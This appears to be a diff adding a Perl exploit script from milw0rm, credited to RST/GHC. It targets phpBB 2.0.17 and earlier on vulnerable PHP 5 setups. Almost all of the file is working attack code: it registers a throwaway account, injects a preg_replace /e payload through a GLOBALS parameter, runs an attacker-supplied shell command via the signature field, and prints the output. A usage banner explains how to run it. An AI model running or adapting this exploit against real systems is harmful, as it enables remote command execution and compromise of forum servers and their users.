@@ -1,0 +1,103 @@
+#!/usr/bin/perl
+
+# phpBB <= 2.0.17 remote command execution exploit
+# need for work: 
+# 1. PHP 5 < 5.0.5
+# 2. register_globals=On
+# 3. magic_quotes off
+# ------------------------------------------------
+# (c)oded by 1dt.w0lf
+# RST/GHC
+# http://rst.void.ru
+# http://ghc.ru
+# 03.11.05
+
+use LWP::UserAgent;
+use HTTP::Cookies;
+
+if(@ARGV < 2) { usage(); }
+
+head();
+
+$xpl = LWP::UserAgent->new() or die;
+$cookie_jar = HTTP::Cookies->new();
+
+for($i=0;$i<5;$i++)
+ {
+  $rand .= int(rand(9));  
+ }
+
+$name     = 'r57phpBB2017xpl'.$rand;
+$password = 'r57phpBB2017xpl'.$rand;
+$path = $ARGV[0];
+$cmd  = $ARGV[1];
+$xpl->cookie_jar( $cookie_jar );
+
+$res = $xpl->post(
+  $path.'profile.php?GLOBALS[signature_bbcode_uid]=(.%2B)/e%00',
+
+  Content  => [  
+              'username' => $name,
+              'email' => $rand.'_bill_gates@microsoft.com',
+              'new_password' => $password,
+              'password_confirm' => $password,
+              'signature' => 'r57:`'.$cmd.'`',
+              'viewemail' => '0',
+              'hideonline' => '1',
+              'notifyreply' => '0',
+              'notifypm' => '0',
+              'popup_pm' => '0',
+              'attachsig' => '0',
+              'allowbbcode' => '1',
+              'allowhtml' => '1',
+              'allowsmilies' => '0',
+              'mode' => 'register',
+              'agreed' => 'true',
+              'coppa' => '0',
+              'submit' => 'Submit',
+              ],
+  );
+
+if($res->content =~ /form action=\"profile.php/) { print "Failed to register user $name\r\n"; exit(); }
+else { print "Done. User $name successfully registered!\r\n"; }
+
+$res = $xpl->post(
+  $path.'login.php',
+  Content  => [
+              'username' => $name,
+              'password' => $password,
+              'redirect' => '',
+              'login'    => 'Log in',
+              ],Referer => $path.'login.php');
+
+$res = $xpl->get($path.'profile.php?mode=editprofile');
+@content = split("\n",$res->content);
+print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n";
+for(@content)
+ {
+ if(/<\/textarea>/) { $p = 0; }
+ print $_."\r\n" if $p;
+ if(/<textarea name="signature"/){ $p = 1; }
+ }
+print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n";
+
+sub head()
+ {
+ print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n";
+ print " PhpBB <= 2.0.17, PHP 5 < 5.0.5 remote command execution exploit by RST/GHC\r\n";   
+ print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n";
+ }
+ 
+sub usage()
+ {
+ head();
+ print " Usage: r57phpBB2017.pl <path> <cmd>\r\n";
+ print " <path> - Path to forum e.g. http://phpbb.com/forum/\r\n";
+ print " <cmd>  - Command for execute\r\n";
+ print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n";
+ print "(c)oded by 1dt.w0lf , RST/GHC , http://rst.void.ru , http://ghc.ru\r\n";
+ print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n";
+ exit();
+ }
+
+# milw0rm.com [2005-12-24]
